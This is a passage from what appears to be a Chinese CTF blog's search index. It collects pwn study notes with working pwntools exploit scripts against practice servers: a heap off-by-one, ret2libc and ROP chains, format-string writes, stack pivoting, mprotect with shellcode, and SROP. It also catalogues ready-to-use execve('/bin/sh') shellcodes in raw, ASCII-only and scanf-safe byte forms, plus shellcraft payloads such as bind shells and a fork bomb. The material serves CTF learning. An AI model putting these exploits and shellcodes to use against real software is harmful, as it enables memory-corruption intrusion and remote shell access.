[0,2,4,6,8,10,13,16,20]:\n     try:\n      print(\"i :\",i)\n      print(\"j :\",j)\n      connetc()\n      pwn(i,int(j))\n          p.close()\n     except :\n      print(\"...\")\n      p.close()\n\n```\n\n# off_by_one\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level='debug'\ncontext.arch='amd64'\n\ndef add(size,contet):\n    p.sendafter(\"Your choice :\",b'1')\n    p.sendafter(\"Size of Heap :\",str(size))\n    p.sendafter(\"Content of heap:\",contet)\n\ndef edit(index,contet):\n    p.sendafter(\"Your choice :\",b'2')\n    p.sendafter(\"Index :\",str(index))\n    p.sendafter(\"Content of heap :\",contet)\n\ndef show(index):\n    p.sendafter(\"Your choice :\",b'3')\n    p.sendafter(\"Index :\", str(index))\n\ndef dele(index):\n    p.sendafter(\"Your choice :\",b'4')\n    p.sendlineafter(\"Index :\",str(index))\n\n# p= process(\"./heapcreator\")\np=remote(\"node4.buuoj.cn\",27274)\nadd(0x18,b'a')\nadd(0x10,b'b')\nadd(0x10,b'c')\nadd(0x10,b'/bin/sh')\nedit(0,b'a'*0x18+b'\\x81')\ndele(1)\nadd(0x70,b'a')\nedit(1,0x10*b'b'+p64(0)+p64(0x21)+p64(0x40)+p64(0x000000000602018))\n# attach(p)\nshow(1)\nfree=p.recvuntil(\"\\x7f\")[-6:]+b'\\0'*2\nfree = u64(free)\nprint(hex(free))\nlibc=LibcSearcher(\"free\",free)\nsystem=libc.dump(\"system\")\nprint(libc)\n#attach(p)\nedit(1,p64(system+free-libc.dump(\"free\")))\ndele(3)\np.interactive()\n```\n\n","categories":["模板"],"tags":["heap"]},{"title":"汇编shell模板","url":"/2023/09/26/%E6%A8%A1%E6%9D%BF/shellcode%E6%A8%A1%E6%9D%BF/","content":"\n# 最短shellcode\n\n## i386长度18\n\n```\nb'j\\x0bXSh//shh/bin\\x89\\xe3\\xcd\\x80'\n```\n\n```bash\npush   0xb\npop    eax\npush   ebx\npush   0x68732f2f\npush   0x6e69622f\nmov    ebx,esp\nint    0x80\n```\n\n##  amd64长度22\n\n```\nb'H1\\xf6VH\\xbf/bin//shWT_\\xb0;\\x99\\x0f\\x05'\n```\n\n```bash\nxor \trsi,\trsi\t\t\t\npush\trsi\t\t\t\t\nmov \trdi,\t0x68732f2f6e69622f\t \npush\trdi\npush\trsp\t\t\npop\trdi\t\t\t\t\nmov \tal,\t59\t\t\t\ncdq\t\t\t\t\t\nsyscall\n```\n\n# 沙盒下最短shellcode\n\n## 64位\n\n```\nshellcode='''\n    xor rax, rax   #xor rax,rax是对rax的清零运算操作\n    xor rdi, rdi   #清空rdi寄存器的值\n    xor rsi, rsi   #清空rsi寄存器的值\n    xor rdx, rdx\n    mov rax, 2      #open调用号为2\n    mov rdi, 0x67616c662f2e   #为galf/.为./flag的相反   0x67616c662f2e为/flag的ASCII码的十六进制\n    push rdi\n    mov rdi, rsp\n    syscall   #系统调用前，linux在eax寄存器里写入子功能号，断止处理程序根据eax寄存器的值来判断用户进程申请哪类系统调用。\n\n    mov rdx, 0x100   #sys_read(3,file,0x100)\n    mov rsi, rdi\n    mov rdi, rax\n    mov rax, 0      #read调用号为0,0为文件描述符，即外部输入，例如键盘\n    syscall\n    \n    mov rdi, 1      #sys_write(1,file,0x30)\n    mov rax, 1      #write调用号为1,1为文件描述符，指的是屏幕\n    syscall\n\n'''\n```\n\n## 32位\n\n```python\nshellcode = \"\"\"\n/*open(./flag)*/\npush 0x1010101\nxor dword ptr [esp], 0x1016660\npush 0x6c662f2e\nmov eax,0x5\nmov ebx,esp\nxor ecx,ecx\nint 0x80\n/*read(fd,buf,0x100)*/\nmov ebx,eax\nmov ecx,esp\nmov edx,0x30\nmov eax,0x3\nint 0x80\n/*write(1,buf,0x100)*/\nmov ebx,0x1\nmov eax,0x4\nint 0x80\n\"\"\"\n```\n\n\n# 32位 短字节shellcode --> 21字节\n\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\n\n# 32位 纯ascii字符shellcode\nPYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA\n\n# 32位 scanf可读取的shellcode\n\\xeb\\x1b\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x29\\xc0\\xaa\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x29\\xc0\\xab\\xb0\\x08\\x04\\x03\\xcd\\x80\\xe8\\xe0\\xff\\xff\\xff/bin/sh\n\n# 64位 scanf可读取的shellcode 22字节\n\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\n\n# 64位 较短的shellcode  23字节\n\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\n\n# 64位 纯ascii字符shellcode\nPh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\n\n# 其他功能的shell（来自shellcraft）\n\n1. `amd64.linux.amd64_to_i386` - AMD64 到 i386 转换\n2. `amd64.linux.bindsh` - 绑定式 Shell\n3. `amd64.linux.cat` - 查看文件内容\n4. `amd64.linux.cat2` - 查看文件内容（第二版本）\n5. `amd64.linux.connect` - 连接指定主机和端口\n6. `amd64.linux.connectstager` - 连接分阶段的指定主机和端口\n7. `amd64.linux.dupio` - 复制输入/输出\n8. `amd64.linux.dupsh` - 复制 Shell\n9. `amd64.linux.echo` - 回显\n10. `amd64.linux.egghunter` - 查找特定标记的代码（\"蛋猎手\"）\n11. `amd64.linux.findpeer` - 查找对等体\n12. `amd64.linux.findpeersh` - 查找对等体（带 Shell）\n13. `amd64.linux.findpeerstager` - 查找对等体（分阶段）\n14. `amd64.linux.forkbomb` - Fork 炸弹\n15. `amd64.linux.forkexit` - Fork 后退出\n16. `amd64.linux.getpid` - 获取当前进程 ID\n17. `amd64.linux.kill` - 终止指定进程\n18. `amd64.linux.killparent` - 终止父进程\n19. `amd64.linux.listen` - 监听指定端口\n20. `amd64.linux.loader` - 加载器\n21. `amd64.linux.loader_append` - 加载器附加\n22. `amd64.linux.membot` - 内存机器人\n23. `amd64.linux.migrate_stack` - 迁移堆栈\n24. `amd64.linux.mmap_rwx` - 映射内存区域为可读可写可执行\n25. `amd64.linux.read` - 读取文件内容\n26. `amd64.linux.read_upto` - 读取文件内容（直到某点）\n27. `amd64.linux.readfile` - 读取文件\n28. `amd64.linux.readinto` - 读取到指定位置\n29. `amd64.linux.readloop` - 循环读取\n30. `amd64.linux.readn` - 读取指定长度\n31. `amd64.linux.readptr` - 读取指针\n32. `amd64.linux.recvsize` - 接收数据并返回大小\n33. `amd64.linux.setregid` - 设置实际和有效的组 ID\n34. `amd64.linux.setresuid` - 设置实际、有效和保存的用户 ID\n35. `amd64.linux.setreuid` - 设置实际和有效的用户 ID\n36. `amd64.linux.sh` - Shell\n37. `amd64.linux.socket` - 创建套接字\n38. `amd64.linux.stage` - 分阶段执行\n39. `amd64.linux.stager` - 阶段执行\n40. `amd64.linux.strace_dos` - 使用strace进行拒绝服务攻击\n41. `amd64.linux.syscall` - 系统调用\n42. `amd64.linux.writeloop` - 循环写入数据\n\n## 示例：（未检验arch的沙箱）\n\n```\n\nfrom pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\n#p=process(\"./pwn\")\np=remote(\"node.nsctf.cn\",57981)\nshellcode=asm(\"\"\"\n mov rsp,0x101000;\n\"\"\")\nshellcode+=asm(shellcraft.amd64_to_i386())\ncontext.clear()\ncontext.update(arch=\"i386\")\nshellcode+=asm(shellcraft.cat(\"/flag\"))\np.send(shellcode)\np.interactive()\n```\n\n","categories":["模板"],"tags":["shellcode"]},{"title":"pwn从头开始的复习（fmt篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88fmt%E7%AF%87%EF%BC%89/","content":"\n具体学习去看西电文档\n\n# 格式化字符串修改栈内容\n\n```\nfrom pwn import *\n# remote()建立远程连接,指明ip和port\nio = remote('node4.buuoj.cn',29147)\n#io=process(\"./printf\")\npayload= p32(0x0804C044) + b\"%10$n\"\nio.sendlineafter(\"your name:\",payload) #发送数据\nio.interactive() #与shell进行交互\n#0804c044\n```\n\n# 高级运用\n\n我自己出的题，字符串空间严重不足，必须利用栈空间\n\n[fmt下载](/downloads_fuxi/fmt)\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\np=remote(\"ctf.v50to.cc\",10286)\n#p=process(\"./fmt\")\nfor i in range(5):\n    p.recvuntil(\"what's \")\n    a = p.recvuntil(\" add \")[:-4]\n    b = p.recvuntil(\"\\n\")[:-1]\n    c = int(a) + int(b)\n    print(c)\n    p.sendline(str(c))\np.sendlineafter(\"Cherish it\",b'1')\nfmt=b\"%10$p^\"\np.sendlineafter(\"Input:\",fmt)\np.recvuntil(\":\")\nebp=int(p.recvuntil(\"^\")[:-1],16)\nsleep(1)\nret_game_addr=ebp+8\na=ret_game_addr%0x100\nprint(a)\n\n\np.sendlineafter(\"[2]leave\",b'1')##weiyi=8\nfmt=b\"%\"+str(a).encode()+b\"c%10$hhn\"\np.sendlineafter(\"Input:\",fmt)##ebp=10 ret=11\nsleep(1)\n\n#attach(p)\np.sendlineafter(\"[2]leave\",b'1')#ebp=14 ret=15\nfmt=b\"%40c%14$hhn\"\np.sendlineafter(\"Input:\",fmt)\np.interactive()\n```\n\n","categories":["复习"],"tags":["fmt"]},{"title":"pwn从头开始的复习（rop中级篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E4%B8%AD%E7%BA%A7%E7%AF%87%EF%BC%89/","content":"\n\n\n# libcsearcher\n\nret2libc的时候不一定会给libc（大多数情况不给）\n\n所以需要这个工具去根据泄露出来的libc搜索版本\n\n给一个例题，本题有多解，我自己写了三解\n\n[例题下载](/downloads_fuxi/PicoCTF_2018_rop_chain)\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\n\np = remote('node4.buuoj.cn',26558)\nlibc = ELF(\"libc-2.27.so\")\ncontext.log_level=\"debug\"\nelf=ELF(\"PicoCTF_2018_rop_chain\")\nputs_plt=elf.plt[\"puts\"]\nputs_got=elf.got[\"puts\"]\nmain_addr=elf.sym[\"main\"]\npayload=(28)*b'a'+p32(puts_plt)+p32(main_addr)+p32(puts_got)\np.sendlineafter(\">\",payload)\nputs_addr = u32(p.recvuntil('\\xf7')[-4:])\n\nlibc_base=puts_addr-libc.sym['puts']\nsystem=libc_base+libc.sym['system']\nsh=libc_base+next(libc.search(b'/bin/sh'))\npayload_=28*b'a'+p32(system)+p32(main_addr)+p32(sh)\np.sendlineafter(\">\",payload_)\np.interactive()\n\n```\n\n\n\n# mprotect\n\nmprotect这是一个函数，可以修改一段区域的权限，遇到的时候就能考虑使用\n\nmprotect 函数用于设置一块内存的保护权限（将从 start 开始、长度为 len 的内存的保护属性修改为 prot 指定的值），函数原型如下所示：\n\n```\n#include <sys/mman.h>\n\nint mprotect(void *addr, size_t len, int prot);\nprot 的取值如下，通过 |\n 可以将几个属性结合使用（值相加）：\n- PROT_READ：可写，值为 1\n- PROT_WRITE：可读， 值为 2\n- PROT_EXEC：可执行，值为 4\n- PROT_NONE：不允许访问，值为 0\n```\n\n[例题下载](/downloads_fuxi/mprotect)\n\n```\nfrom pwn import *\nq = remote('node4.buuoj.cn',28807)\n#q = process('./get_started_3dsctf_2016')\ncontext.log_level = 'debug'\nsleep(0.1)\n\npayload = b'a'*56\npayload += p32(0x080489A0) + p32(0x080489A0)\npayload += p32(0x308CD64F) + p32(0x195719D1)\nq.sendline(payload)\nsleep(0.1)\nq.interactive()\n\n\nfrom pwn import *\nq = remote('node3.buuoj.cn',29645)\n#q = process('./get_started_3dsctf_2016')\ncontext.log_level = 'debug'\n\nmprotect = 0x0806EC80\nbuf = 0x80ea000\npop_3_ret = 0x0804f460\nread_addr = 0x0806E140\n\npayload = 'a'*56\npayload += p32(mprotect)\npayload += p32(pop_3_ret)\npayload += p32(buf)\npayload += p32(0x1000)\npayload += p32(0x7)\npayload += p32(read_addr)\npayload += p32(buf)\npayload += p32(0)\npayload += p32(buf)\npayload += p32(0x100)\nq.sendline(payload)\nsleep(0.1)\n\nshellcode = asm(shellcraft.sh(),arch='i386',os='linux')\nq.sendline(shellcode)\nsleep(0.1)\nq.interactive()\n\n```\n\n\n\n# 栈迁移\n\n用来解决溢出量不够的rop\n\n可以先通过leave|ret控制栈地址，再返回到溢出点，就可以衔接两次溢出\n\n先去ROPgetdet去找leave|ret\n\n```\nROPgadget --binary pwn --only \"leave|ret\"\n```\n\n[例题下载](/downloads_fuxi/ciscn_2019_es_2)\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\nsys_addr=0x08048400\np = remote('node4.buuoj.cn',25264)\npayload1 = b'a'*0x27+b'@'\np.send(payload1)\np.recvuntil(b'@')\nebp = u32(p.recv(4))\nprint (\"ebp----->\",hex(ebp))\nleave_ret=0x080484b8\npayload2=b'aaaa'+p32(sys_addr)+4*b'a'+p32(ebp-0x28)+b'/bin/sh'+b'\\0'+16*b'a'+p32(ebp-0x38)+p32(leave_ret)\n#                4            8     12             16      23   24       40    44\n#        38     34            30    2c             28\np.send(payload2)\np.interactive()\n```\n\n","categories":["复习"],"tags":["rop"]},{"title":"pwn从头开始的复习（rop初级篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E7%AF%87%EF%BC%89/","content":"\n本篇将以难度顺序讲解各种难度的pwn，因为传参方式不同，这里给两类64位和32位\n\n我直接给出未解释的地址一般是ida给的或者ROPgadget 给的，去看我的模板去\n\n# ret2shell（直接留了后门，最简单的，新手入门用）\n\n## 32位\n\n[ret2shell32例题下载](/downloads_fuxi/ret2shell32)\n\n```\nfrom pwn import *\np = process('./ret2shell32')\ncontext.log_level=\"debug\"\n\npayload=(0x6C+4)*b'a'+p32(0x080485CB)\np.sendlineafter(\"Please enter your string:\",payload)\np.interactive()\n#你的当前文件夹下没有flag，显示Flag File is Missing.就代表通了\n\n```\n\n## 64位\n\n[ret2shell64例题下载](/downloads_fuxi/ret2shell64)\n\n```\nfrom pwn import *\n# remote()建立远程连接,指明ip和port\nio = remote('node4.buuoj.cn',29823)\n#io=process(\"./ret2shell64\")\npayload = b'a'*(0x40 + 0x8) + p64(0x40060D)\nio.sendline(payload) #发送数据\nio.interactive() #与shell进行交互\n\n#这里好像64和32没什么区别\n```\n\n\n\n# ret2system（比前面那个难一丢丢，直接给了system函数）\n\n例题来自buu ：ciscn_2019_ne_5，也可以到网上看看别人的题解\n\n## 32位\n\n[ret2system32例题下载](/downloads_fuxi/ret2system32)\n\n本题比较水，出题人偷偷地留了一个带‘sh’的字符串，可以作为参数传给system直接getshell\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\n#p = remote('node4.buuoj.cn',29730)\np = process(\"./ret2system32\")\n\np.sendlineafter(\"password:\",b'administrator')#逆向一下，绕过字符串检测\np.sendlineafter(\"0.Exit\\n:\",b'1')\npayload=b\"a\"*76+p32(0x080484D0)+  4*b'a'  +p32(0x080482ea)\n     #          sys函数plt       填充ebp     sh字符串地址\np.sendlineafter(\"new log info:\",payload)\np.sendlineafter(\"0.Exit\\n:\",b'4')\np.interactive()\n\n\n#ROPgadget --binary ./ciscn_2019_ne_5 --string 'sh'\n#这是一条ROPgadget指令，环境配好以后可以查找文件中的sh字符串位置\n```\n\n## 64位\n\n实在找不到啦，关于64位和32位的区别在下一阶段可以了解，这段算了\n\n# ret2libc（真正进入pwn的第一步）\n\n这部分主要是借助一些输出函数write，puts，printf泄露出一个函数的真实地址，进而得到libc的真实地址，可以调用libc里的任意函数getshell\n\n由于每个程序里面的输出函数不一致，需要的参数也不同，所以exp略有区别\n\n下面是一道32位利用write泄露题的exp\n\n## 32位write\n\n[write32下载](/downloads_fuxi/write32)\n\nlibc下载：https://buuoj.cn/resources 在里面选择32位libc-2.23.so\n\n\n\n```\nfrom pwn import *\n\n#io=remote('node4.buuoj.cn',28321)\nio=process('./pwn')\nelf=ELF('./babyrop')\nlibc=ELF('./libc-2.23.so')\n\nsystem_libc=libc.symbols['system']\nbinsh_libc=next(libc.search(b'/bin/sh'))\n\nwrite_libc=libc.symbols['write']\nwrite_plt=elf.plt['write']\nwrite_got=elf.got['write']\n\nmain_addr=0x8048825\npayload=b'\\x00'+b'\\xff'*10\nio.sendline(payload)\n\nio.recvuntil(b\"Correct\\n\")\npayload=b'a'*(0xe7+4)+p32(write_plt)+p32(main_addr)\n#                    ret1           ret2\npayload+=p32(1)+p32(write_got)+p32(4)\n#write   par1   par2           par3\nio.sendline(payload)\nwrite_addr=u32(io.recv(4))\nbase=write_addr-write_libc\n\n\nsystem_addr=system_libc+base\nbinsh_addr=binsh_libc+base\npayload=b'\\x00'+b'\\xff'*10\nio.sendline(payload)\nio.recvuntil(b\"Correct\\n\")\npayload=b'a'*(0xe7+4)+p32(system_addr)+p32(main_addr)\npayload+=p32(binsh_addr)\nio.sendline(payload)\nio.interactive()\n# rdi, rsi, rdx, rcx, r8, r9\n\n```\n\n## 64位write\n\n[write64下载](/downloads_fuxi/write64)\n\nlibc下载：https://buuoj.cn/resources 在里面选择32位libc-2.23.so\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level=\"debug\"\np = remote('node4.buuoj.cn',26446)\nelf=ELF(\"level3_x64\")\nmain_addr = elf.sym['main']\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\npop_rdi_ret=0x00000000004006b3\npop_rsi_r15_ret=0x00000000004006b1\n\npayload =b'a' * (0x80+8) + p64(pop_rdi_ret) +p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0) +p64(write_plt)+ p64(main_addr)\np.sendlineafter(\":\",payload)\n\nwrite_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(write_addr))\n\nlibc = ELF(\"libc-2.23.so\")\nlibc_base = write_addr - libc.sym['write']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + next(libc.search(b'/bin/sh'))\nret_addr=0x00000000004004c9\n\npayload2 =b'a' * (0x80+8)  +p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)\np.sendlineafter(\":\",payload2)\np.interactive()\n\n```\n\n剩下两种懒得写了，和write只有参数不同，有兴趣自己到网上找找，或者去heshi的github去捞\n\n","categories":["复习"],"tags":["rop"]},{"title":"pwn从头开始的复习（rop高级篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E9%AB%98%E7%BA%A7%E7%AF%87%EF%BC%89/","content":"\n除了之前的一般的rop，还有一些高级的运用，srop和frop\n\n# srop\n\n还没完全学成，在我的导航里面有参考资料\n\n```\nfrom pwn import *\ncontext.arch='amd64'\ncontext.log_level='debug'\npower_rop1=0x0000000000400806\npower_rop2=0x00000000004007F0\nbuf_inp=0x0000000000601039\npop_rbp=0x0000000000400628\nbss_addr=0x0000000000601050\ndef getpower(avg1,avg2,avg3,got):\n    payload=p64(power_rop1)+p64(0)+p64(0)+p64(1)+p64(got)+p64(avg1)+p64(avg2)+p64(avg3)\n    payload+=p64(power_rop2)+p64(0)*7#为什么是7呢，因为虽然只有6个pop但是上面还有个rsp+8\n    return payload\n\np=process('./pwn')\n\n\n#p=remote(\"ctf.v50to.cc\",10402)\nelf=ELF('pwn')\nlibc=ELF('./libc-2.27.so')\nsyscall_got=elf.got['syscall']\nseccomp_init_got=elf.symbols['seccomp_init']\n\n\n\npayload=b'flag\\x00\\x00\\x00\\x00'*(0x30//8)+p64(0x4007b0)\npayload+=getpower(0,0,buf_inp,syscall_got)\n\npayload+=getpower(1,1,syscall_got,syscall_got)\npayload+=p64(pop_rbp)+p64(buf_inp+8)\n\npayload+=p64(0x000000000040076D)\n\np.sendlineafter(b'!!!\\n',payload)\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\np.sendline(b'flag\\x00\\x00\\x00\\x00'+p64(0x601000))\n# pause()\n\n\nrecvaddr=p.recvuntil(b'\\x7f')\nsysaddr=u64(recvaddr[-6:].ljust(8,b'\\x00'))\nprint(hex(sysaddr))\nlibcbase=sysaddr-libc.symbols['syscall']\nprint('libcbase',hex(libcbase))\n\npop_rax=libcbase+0x000000000001b500\nopen_addr=libcbase+libc.symbols['open']\nread_addr=libcbase+libc.symbols['read']\nwrite_addr=libcbase+libc.symbols['write']\npop_rdi=0x0000000000400813\npop_rdx_rsi=libcbase+0x0000000000130539\npop_rsp=libcbase+0x000000000000396c\npop_rcx=libcbase+0x00000000000e433e\n\npayload=b'flag\\x00\\x00\\x00\\x00'*(0x30//8)+p64(0x4007b0)\npayload+=p64(pop_rax)+p64(2)+p64(pop_rcx)+p64(0)\n# payload+=getpower(buf_inp,0,0,syscall_got)\npayload+=flat([pop_rdi,buf_inp,pop_rdx_rsi,0,0,pop_rbp,buf_inp+0x30,sysaddr+23])\npayload+=p64(pop_rax)+p64(0)\npayload+=flat([pop_rdi,3,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])\npayload+=p64(pop_rax)+p64(1)\npayload+=flat([pop_rdi,1,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])\n# payload+=flat([pop_rdi,buf_inp-1,pop_rdx_rsi,0,0,open_addr])\n# payload+=\npayload+=p64(0x000000000040076D)\nprint('len',len(payload))\n# p.sendlineafter(b'NepCTF2023!\\n',payload)\np.sendlineafter(b'!!!\\n',payload)\n\n# # pop_rax=libcbase+0x000000000001b500\n# # payload2=\n\np.interactive()\n```\n\n# frop\n\n就是iofile，在我的导航里面有\n","categories":["复习"],"tags":["rop"]},{"title":"pwn从头开始的复习（shellcode篇）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88shellcode%E7%AF%87%EF%BC%89/","content":"\n\n\nz\n\n\n\n# 最简单的shellcode，写什么执行什么\n\n直接用shellcode.sh生成，再asm转换为二进制\n\n[例题下载](\\source\\downloads_fuxi\\shellcode1)\n\n```\nfrom pwn import *\n# remote()建立远程连接,指明ip和port\nio = remote('node4.buuoj.cn',28957)\ncontext(log_level = \"debug\",arch = \"i386\",os = \"linux\")\n#io=process(\"./level1\")\nio.recvuntil(\"What's this:\")\nbuf_addr=io.recvuntil(b\"?\")\nbuf_addr= buf_addr[:-1]\nshellcode = asm(shellcraft.sh())\npayload = shellcode.ljust(140,b'a')+p32(int(buf_addr, 16))\nio.sendline(payload) #发送数据\nio.interactive() #与shell进行交互\n\n```\n\n# 存在过滤的shellcode\n\n去我的分组对抗1看看，熊写了一道\n\n机器码对应汇编： https://blog.csdn.net/weixin_43708844/article/details/103211703\n\n# 长度不足的shellcode\n\n找目前最短的shellcode，有别的想法可以接着开发\n\ni386长度18\n\n```bash\npush   0xb\npop    eax\npush   ebx\npush   0x68732f2f\npush   0x6e69622f\nmov    ebx,esp\nint    0x80\n```\n\n amd64长度22\n\n```bash\nxor \trsi,\trsi\t\t\t\npush\trsi\t\t\t\t\nmov \trdi,\t0x68732f2f6e69622f\t \npush\trdi\npush\trsp\t\t\npop\trdi\t\t\t\t\nmov \tal,\t59\t\t\t\ncdq\t\t\t\t\t\nsyscall\n```\n\n","categories":["复习"],"tags":["shellcode"]},{"title":"pwn从头开始的复习（工具使用）","url":"/2023/09/21/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%89/","content":"\n\n\n# glibc-all-in-one\n\n在glibc-all-in-one目录下\n\n## 获取可下载的libc列表\n\n```\ncat list \n```\n\n```\n./download name\n```\n\n## 查看对应连接器\n\n```\nstrings buu/libc-2.23-x64.so | grep ubuntu\n```\n\n## 查看目前链接信息\n\n```\nldd -v pwn\n```\n\n## 换源\n\n```\npatchelf --replace-needed libc.so.6  /home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 heap_Double_Free\n```\n\n```\npatchelf --set-interpreter /home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./heap_Double_Free \n```\n\n\n\n# Onegadget \n\n```\none_gadget filename  #libc文件名\n```\n\n一运行就能拿到shell的地址，但是会标使用条件，找能实现的搞就好\n\n#  ROPgadget\n\n## 搜索ret指令的地址\n\n```\n ROPgadget  –binary filename –only ‘ret’ \n```\n\n## 控制寄存器用\n\n```\nROPgadget --binary fliename --only \"pop|ret\"\n```\n\n## 静态编译文件直接得到完整rop链\n\n```\nROPgadget --binary fliename --ropchain \n```\n\n## 搜索字符串，给出字符串地址\n\n```\nROPgadget --binary ./fliename --string 'sh'\n```\n\n# 下面是一些零散的小python语句\n\n```\n context(log_level = \"debug\",arch = \"i386\",os = \"linux\") \n \\#表明系统 \n```\n\n```\npayload = fmtstr_payload(offset, {atoi_got : sys_plt}) \n自动生成fmt_payload\n```\n\n```\n shellcode = asm(shellcraft.sh())#<-这里利用pwntools的asm()函数来写shellcode. \n```\n\n```\npayload = flat([shellcode.ljust(padding,'A'),buf_addr])\n\n这段代码是将shellcode和buf_addr连接成一个字符串，其中shellcode右侧填充'A'字符，直到字符串长度为padding。然后使用flat函数将这个字符串转换为二进制格式，以便在后续的操作中使用。\n```\n\n## 应付pie\n\n```\nfor k in range(500): \n    p.recvuntil(b'welcome\\n') \n    i=random.randint(0,14) \n    payload = b'A'*104 +canary+p64(0x7fffffffdddddddd) + p8(0x31)+p8(0x02+i*16) \n    p.send(payload) \n    \n```\n\n","categories":["复习"],"tags":["工具"]},{"title":"pwn从头开始的复习（工具篇）","url":"/2023/08/26/%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AF%87%EF%BC%89/","content":"\n\n\n# 前言\n\n开学在即，复习一遍pwn。顺便给后人留点东西。\n\n# 所需软件及软件包\n\n## 写笔记用：\n\nTypora （便于上传博客，再没用过word写笔记）\n\n## c语言：\n\ncode blocks（代码补全，报错提示和调试做得都很好，而且比用来写项目的操作简单打开快）\n\n## Python：\n\nPyCharm（好用没得说）\n\n## 编辑二进制：\n\nvscode（免费且插件多，必备）配置hex editor\n\n## 查看程序源代码和反汇编：\n\nida \n\n##  另外：\n\n需要一款科学上网软件。由于本篇文章要上云，我就不提了。\n\n## Linux64位虚拟机\n\n乌班图和kali都可，建议乌班图，虽然kali主打一个网络安全，但乌班图支持的软件更多一些。\n\n### 下面是虚拟机里面需要的东西：\n\npython3（无需编辑器，在主机编，虚拟机带不动，能运行就行）\n\npython需要的软件包（安装指令去csdn找）：\n\n1.pwntools\n\n2.pwngdb\n\n3.libcsearcher\n\n需要安装的指令：\n\n1.Onegadget\n\n2.ROPgadget\n\n这些搞完就可以做题了\n\n# 学习资源\n\n参照西电的pdf，一篇就够了，一千多页\n\nchatgpt，不懂就问它，它真什么都会\n\n# 刷题网站\n\nbuuctf，pwn按照解出人数排，第一页做完就算入门了，做两页就行，后面的难度层次不齐\n\n西电ctf，我自己也在做，每年都开两个月，质量蛮不错\n\n做不出来的百度一下，这些网站比较大众，每题都有人写WP和总结\n\n","categories":["复习"],"tags":["工具"]},{"title":"about","url":"/about/index.html","content":""},{"title":"导航","url":"/daohang/index.html","content":"\n# 学习资料\n\n[西电文档在线版](https://www.wenjiangs.com/doc/qlkg1aykwf)\n\n[CookedMelon/Pwn-in-practice: 记录学习pwn的笔记和遇到的题目](https://github.com/CookedMelon/Pwn-in-practice)\n\n# 还没看的WP\n\n[官方Write Up｜DASCTF六月赛 · 二进制专项 | CTF导航](https://www.ctfiot.com/118808.html)\n\n# 工具\n\n[awd pwn通防小工具](https://blog.csdn.net/qq_45595732/article/details/125472253)\n\n[masscan扫描端口](https://blog.csdn.net/weixin_51730169/article/details/124627178)\n\n[AabyssZG/AWD-Guide: AWD比赛指导手册和脚本整理](https://github.com/AabyssZG/AWD-Guide)\n\n[CTF-pwn 